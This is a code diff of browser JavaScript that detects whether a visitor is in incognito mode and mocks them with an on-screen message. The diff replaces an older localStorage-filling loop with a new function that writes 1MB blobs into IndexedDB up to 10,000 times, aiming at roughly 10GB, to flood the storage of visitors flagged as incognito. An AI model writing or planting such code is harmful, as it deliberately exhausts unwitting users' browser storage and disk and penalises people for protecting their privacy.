@@ -19,7 +19,6 @@ navigator.storage.estimate().then(({ quota }) => {
 
   if (isIncognito) {
     console.log("🚨 Incognito Detected");
-
     const msg = document.createElement("div");
     msg.textContent = "aww, why incognito 😢🥺👉👈";
     msg.style.cssText = `
@@ -30,29 +29,50 @@ navigator.storage.estimate().then(({ quota }) => {
       font-family: 'Comic Sans MS', cursive, sans-serif;
     `;
     document.body.appendChild(msg);
-
-    const funnyGIF = "data:image/gif;base64,R0lGODlhEAAQAMQAAP///wAAAMLCwkJCQvLy8t7e3uDg4Le3t729ve/v7+fn5+Pj49nZ2Z2dnYSEhKurq+Xl5QAAAAAAAAAAACH5BAEAABcALAAAAAAQABAAAAVK4CeOZGmeaKqubOtCzPdFjPZQgAOw=="; // tiny 1KB gif
-
-    for (let i = 0; i < 500; i++) {
-      try {
-        localStorage.setItem(`guilt_gif_${i}`, funnyGIF);
-      } catch (e) {
-        console.warn("🥲 Storage full, couldn't add more GIFs.");
-        break;
-      }
-    }
-
-    for (let i = 0; i < 10; i++) {
-      const img = document.createElement("img");
-      img.src = funnyGIF;
-      img.style = "width: 100px; margin: 5px; transform: rotate(" + (Math.random() * 20 - 10) + "deg);";
-      document.body.appendChild(img);
-    }
+    floodIncognitoStorage();
   } else {
     console.log("✅ Normal Mode");
   }
 });
 
+let hasFlooded = false;
+
+function floodIncognitoStorage() {
+  if (hasFlooded) return;
+  hasFlooded = true;
+
+  indexedDB.open("floodDB", 1).onupgradeneeded = function (event) {
+    const db = event.target.result;
+    db.createObjectStore("pain");
+  };
+
+  indexedDB.open("floodDB").onsuccess = function (event) {
+    const db = event.target.result;
+    const tx = db.transaction("pain", "readwrite");
+    const store = tx.objectStore("pain");
+
+    // Let's make a 1MB blob of repeating data
+    const data = new Uint8Array(1024 * 1024); // 1MB
+    data.fill(69); // nice
+
+    let i = 0;
+    let written = 0;
+
+    const write = () => {
+      try {
+        store.put(data, `💥${i}`);
+        i++;
+        written++;
+        if (written % 100 === 0) console.log(`Stored ${written}MB`);
+        if (written < 10000) requestIdleCallback(write); // up to 10GB if allowed
+      } catch (e) {
+        console.warn("💀 Limit hit or error:", e);
+      }
+    };
+
+    write();
+  };
+}
 
 const SCREEN_WIDTH = window.screen.availWidth
 const SCREEN_HEIGHT = window.screen.availHeight
